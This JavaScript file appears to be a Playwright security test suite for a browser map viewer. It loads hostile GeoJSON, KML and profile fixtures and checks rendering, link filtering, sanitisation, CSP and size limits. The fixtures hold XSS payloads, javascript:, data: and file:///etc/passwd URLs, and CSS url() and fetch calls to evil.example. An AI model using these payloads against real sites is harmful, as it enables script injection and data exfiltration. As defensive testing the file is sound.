"use strict";
/* Browser tests for hostile input: files, names, attribute values and
   profiles crafted to inject markup, script, styles or links, or to reach
   anything other than the basemap tile hosts. Every value must render as
   text, and nothing may run or be requested.
   Usage: node tests/security.cjs   (CHROMIUM=/path/to/chromium to override) */
const http = require("node:http");
const fs = require("node:fs");
const path = require("node:path");
const assert = require("node:assert/strict");
const { chromium } = require("playwright-core");

const CORE = path.join(__dirname, "..", "core");
const OUT = path.join(__dirname, "output", "fixtures-security");
const TYPES = { ".html": "text/html", ".js": "text/javascript", ".css": "text/css" };
const TILE_HOSTS = ["tile.openstreetmap.org", "server.arcgisonline.com", "a.tile.opentopomap.org", "b.tile.opentopomap.org", "c.tile.opentopomap.org"];

// Markup that sets a flag if it ever runs.
const XSS = (n) => '<img src=x onerror="window.__xss=' + n + '"><script>window.__xss=' + n + "</script>";

function fixtures() {
  fs.mkdirSync(OUT, { recursive: true });
  const props = {
    name: XSS(1),
    [XSS(2)]: XSS(3),
    status: "<b>bold</b>",
    link_ok: "https://example.com/ok",
    link_js: "javascript:window.__xss=4",
    link_js_spaced: "  JaVaScRiPt:window.__xss=5",
    link_data: "data:text/html,<script>window.__xss=6</script>",
    link_file: "file:///etc/passwd",
    link_app: "omamap://app/file/1/x",
    link_vbs: "vbscript:msgbox(1)",
    link_custom: "steam://run/1",
    link_creds: "https://user:secret@example.com/",
    nested: { html: XSS(7), list: [XSS(8)] },
    // Present on this feature only; others must not show Object.prototype members.
    toString: "own value",
    valueOf: "own too"
  };
  const fc = { type: "FeatureCollection", features: [
    { type: "Feature", id: XSS(9), properties: props, geometry: { type: "Point", coordinates: [-3.2, 55.95] } },
    { type: "Feature", properties: { name: "plain", status: XSS(10) }, geometry: { type: "Point", coordinates: [-3.1, 55.95] } }
  ] };
  // The file name itself is hostile too ('/' is the only character a name can't hold).
  const geo = path.join(OUT, '<img src=x onerror="window.__xss=11">.geojson');
  fs.writeFileSync(geo, JSON.stringify(fc));
  const kml = path.join(OUT, "described.kml");
  fs.writeFileSync(kml, '<?xml version="1.0"?><kml xmlns="http://www.opengis.net/kml/2.2"><Document><Placemark>' +
    "<name>&lt;img src=x onerror=window.__xss=12&gt;</name><description><![CDATA[<script>window.__xss=13</script><a href=\"javascript:window.__xss=14\">x</a>]]></description>" +
    "<Point><coordinates>-3.15,55.96</coordinates></Point></Placemark></Document></kml>");
  const profile = path.join(OUT, "hostile.omamap");
  fs.writeFileSync(profile, JSON.stringify({
    omamap: "profile", version: 1, name: XSS(15), basemap: "constructor",
    view: { lat: "1e999", lng: 0, zoom: 5 },
    datasets: [{
      name: XSS(16), visible: true,
      style: { colour: "red;background:url(https://evil.example/style)", fillOpacity: "1e999", weight: -5, radius: "x", outline: "url(https://evil.example/o)",
        byField: { field: "__proto__", mode: "ranges" } },
      geojson: { type: "FeatureCollection", features: [{ type: "Feature", properties: { a: 1 }, geometry: { type: "Point", coordinates: [-3, 55] } }] }
    }]
  }));
  return { geo, kml, profile };
}

(async () => {
  const server = http.createServer((req, res) => {
    const file = path.join(CORE, decodeURIComponent(new URL(req.url, "http://x").pathname));
    if (!file.startsWith(CORE) || !fs.existsSync(file) || fs.statSync(file).isDirectory()) { res.writeHead(404); return res.end(); }
    res.writeHead(200, { "Content-Type": TYPES[path.extname(file)] || "application/octet-stream" });
    fs.createReadStream(file).pipe(res);
  });
  await new Promise((r) => server.listen(0, "127.0.0.1", r));
  const origin = "http://127.0.0.1:" + server.address().port;
  const browser = await chromium.launch({ executablePath: process.env.CHROMIUM || "/usr/bin/chromium" });
  const page = await browser.newPage({ viewport: { width: 1440, height: 900 } });
  const errors = [], requests = [], csp = [];
  page.on("pageerror", (e) => errors.push(e.message));
  page.on("console", (m) => {
    if (m.type() !== "error") return;
    // CSP refusals are what some checks below expect; collect them separately.
    if (/Content Security Policy/.test(m.text())) csp.push(m.text()); else errors.push(m.text());
  });
  page.on("request", (r) => { const u = new URL(r.url()); if (u.origin !== origin && u.protocol !== "data:" && u.protocol !== "blob:") requests.push(r.url()); });
  page.on("popup", (p) => errors.push("popup opened: " + p.url()));
  await page.route(/^https:\/\//, (r) => r.fulfill({ status: 204 }));
  await page.goto(origin + "/index.html");
  await page.waitForFunction(() => window.OmaMap);

  const results = [];
  const check = async (name, fn) => {
    try { await fn(); results.push("✔ " + name); }
    catch (e) { results.push("✖ " + name + "\n    " + e.message.split("\n").filter(Boolean).slice(0, 8).join(" ")); process.exitCode = 1; }
  };
  const injected = () => page.evaluate(() => ({
    flag: window.__xss,
    // Our UI never creates these elements from data.
    elements: Array.from(document.querySelectorAll(["#layer-list", "#inspector", "#table-panel", "#legend", "#toasts", ".status"]
      .map((c) => c + " img, " + c + " script, " + c + " b, " + c + " iframe").join(", "))).map((e) => e.outerHTML.slice(0, 80))
  }));
  const f = fixtures();

  await page.setInputFiles("#file-input", [f.geo, f.kml]);
  await page.waitForFunction(() => STATE.datasets.length === 2 && document.getElementById("loading").hidden);

  await check("hostile file names, attribute names and values render as text", async () => {
    const names = await page.evaluate(() => STATE.datasets.map((d) => d.name));
    assert.ok(names.includes('<img src=x onerror="window.__xss=11">'), JSON.stringify(names));
    // Select the hostile feature and show everything that displays data.
    await page.evaluate(() => { Table.open(STATE.datasets[0]); Table.choose(0, false); });
    await page.waitForSelector("#inspector:not([hidden])");
    const ds = await page.locator("#insp-ds").textContent();
    assert.equal(ds, '<img src=x onerror="window.__xss=1"><script>window.__xss=1</script>');
    const keys = await page.locator("#insp-attrs th").allTextContents();
    assert.ok(keys.includes('<img src=x onerror="window.__xss=2"><script>window.__xss=2</script>'));
    await page.evaluate(() => { const ds = STATE.datasets[0]; setColourBy(ds, "status", "categories"); renderLegend(); renderLayerList(); });
    const legend = await page.locator("#legend .lg-label").allTextContents();
    assert.ok(legend.includes("<b>bold</b>"), JSON.stringify(legend));
    await page.waitForTimeout(300);
    assert.deepEqual(await injected(), { flag: undefined, elements: [] });
  });

  await check("only http(s) links without credentials become links", async () => {
    const links = await page.locator("#insp-attrs a").evaluateAll((as) => as.map((a) => ({ href: a.getAttribute("href"), target: a.target, rel: a.rel })));
    assert.deepEqual(links, [{ href: "https://example.com/ok", target: "_blank", rel: "noopener noreferrer" }]);
    const text = await page.locator("#insp-attrs").textContent();
    for (const v of ["javascript:window.__xss=4", "data:text/html", "file:///etc/passwd", "omamap://app/file/1/x", "steam://run/1", "https://user:secret@example.com/"]) assert.ok(text.includes(v), v + " should show as text");
  });

  await check("KML descriptions and names stay text", async () => {
    await page.evaluate(() => { Table.open(STATE.datasets[1]); Table.choose(0, false); });
    const rows = await page.locator("#insp-attrs").textContent();
    assert.match(rows, /<script>window.__xss=13<\/script>/);
    assert.equal(await page.locator("#insp-attrs a").count(), 0);
    assert.deepEqual(await injected(), { flag: undefined, elements: [] });
  });

  await check("features show only their own attributes, never Object.prototype members", async () => {
    const r = await page.evaluate(() => {
      const ds = STATE.datasets[0];
      Table.open(ds);
      Table.draw();
      const k = Table.columns.findIndex((c) => c.field === "toString");
      // Only columns in view are drawn: bring this one into view first.
      document.getElementById("tp-scroll").scrollLeft = document.getElementById("tp-header").children[k + 1].offsetLeft;
      Table.draw();
      const col = 1 + k - Table.drawn.c0;
      const cells = Array.from(document.querySelectorAll("#tp-body .tp-row")).map((row) => row.children[col].textContent);
      setColourBy(ds, "toString", "categories");
      const bf = ds.style.byField;
      return { cells: cells, classes: bf.classes.map((c) => c.label), missing: bf.missingCount, numeric: fieldIsNumeric(ds, "valueOf") };
    });
    assert.deepEqual(r.cells.sort(), ["", "own value"]);
    assert.deepEqual(r.classes, ["own value"]);
    assert.equal(r.missing, 1);
  });

  await check("a hostile profile is cleaned: styles, basemap, view and names", async () => {
    page.once("dialog", (d) => d.accept());
    await page.setInputFiles("#file-input", [f.profile]);
    await page.waitForFunction(() => STATE.datasets.length === 1 && document.getElementById("loading").hidden);
    const r = await page.evaluate(() => {
      const ds = STATE.datasets[0];
      return { name: ds.name, style: { colour: ds.style.colour, fillOpacity: ds.style.fillOpacity, weight: ds.style.weight, radius: ds.style.radius, outline: ds.style.outline, byField: ds.style.byField },
        basemap: STATE.basemapPref, fill: ds.layers[0].options.fillColor, center: STATE.map.getCenter().lat };
    });
    assert.equal(r.name, '<img src=x onerror="window.__xss=16"><script>window.__xss=16</script>');
    assert.equal(r.style.colour, null);
    assert.equal(r.style.byField, null);
    assert.equal(r.style.outline, "auto");
    assert.equal(r.style.fillOpacity, 0.9);   // "1e999" is not finite: default kept
    assert.equal(r.style.weight, 0.5);        // clamped
    assert.match(r.fill, /^#[0-9a-f]{6}$/);
    assert.notEqual(r.basemap, "constructor");
    assert.ok(Number.isFinite(r.center));
    assert.deepEqual(await injected(), { flag: undefined, elements: [] });
  });

  await check("the page CSP refuses inline style attributes", async () => {
    // With 'unsafe-inline' an injected style="" could restyle or exfiltrate via url().
    const colour = await page.evaluate(() => {
      const d = document.createElement("div");
      d.setAttribute("style", "color: rgb(1, 2, 3)");
      document.body.appendChild(d);
      const c = getComputedStyle(d).color;
      d.remove();
      return c;
    });
    assert.notEqual(colour, "rgb(1, 2, 3)");
    assert.ok(csp.length >= 1, "a CSP refusal is reported");
  });

  await check("the CSP refuses scripts, frames and connections to other origins", async () => {
    const r = await page.evaluate(async () => {
      const out = {};
      try { await fetch("https://evil.example/x"); out.fetch = "allowed"; } catch (e) { out.fetch = "blocked"; }
      const s = document.createElement("script"); s.textContent = "window.__xss = 20"; document.body.appendChild(s);
      out.inline = window.__xss === 20 ? "ran" : "blocked";
      out.policy = document.querySelector('meta[http-equiv="Content-Security-Policy"]').content;
      return out;
    });
    assert.equal(r.fetch, "blocked");
    assert.equal(r.inline, "blocked");
    // (Code evaluated through DevTools may bypass eval checks, so check the policy text.)
    assert.doesNotMatch(r.policy, /unsafe-eval|unsafe-inline|\*/);
  });

  await check("oversized files are refused before they are read into memory", async () => {
    // Loose shapefile parts used to be read whole, whatever their size.
    const r = await page.evaluate(async () => {
      const read = [];
      const big = (name) => ({ name: name, size: 5 * 1024 * 1024 * 1024, arrayBuffer: () => { read.push(name); return Promise.resolve(new ArrayBuffer(8)); } });
      const before = document.querySelectorAll(".toast.err").length;
      await handleFiles([big("huge.geojson"), big("huge.zip"), big("roads.shp"), big("roads.dbf")]);
      const toasts = Array.from(document.querySelectorAll(".toast.err")).slice(before).map((t) => t.textContent);
      return { read: read, toasts: toasts };
    });
    assert.deepEqual(r.read, []);
    assert.equal(r.toasts.length, 3, JSON.stringify(r.toasts));
    assert.ok(r.toasts.every((t) => /too large/.test(t)), JSON.stringify(r.toasts));
  });

  await check("KML or GPX with too many features is refused before it is parsed", async () => {
    // KML/GPX parse on the main thread; this one used to freeze the window
    // for seconds (a minute at 100 MiB) before the feature limit applied.
    const r = await page.evaluate(async () => {
      const placemark = "<Placemark><Point><coordinates>1,1</coordinates></Point></Placemark>";
      const kml = '<?xml version="1.0"?><kml xmlns="http://www.opengis.net/kml/2.2"><Document>' + placemark.repeat(500001) + "</Document></kml>";
      const gpx = '<?xml version="1.0"?><gpx version="1.1" xmlns="http://www.topografix.com/GPX/1/1">' + '<wpt lat="1" lon="1"/>'.repeat(500001) + "</gpx>";
      const out = [];
      for (const [text, ext] of [[kml, "kml"], [gpx, "gpx"]]) {
        const t = performance.now();
        try { OmaParse.xmlToGeoJSON(text, ext); out.push("accepted"); }
        catch (e) { out.push(e.message); }
        out.push(performance.now() - t < 3000);
      }
      return out;
    });
    assert.deepEqual(r, ["File has more than 500,000 placemarks.", true, "File has more than 500,000 waypoints, tracks and routes.", true]);
  });

  await check("only basemap tile hosts were contacted", async () => {
    const hosts = Array.from(new Set(requests.map((u) => new URL(u).host)));
    assert.deepEqual(hosts.filter((h) => !TILE_HOSTS.includes(h)), []);
  });

  await check("no page errors and no popups", async () => { assert.deepEqual(errors, []); });

  await browser.close();
  server.close();
  console.log(results.join("\n"));
})().catch((e) => { console.error(e); process.exit(1); });
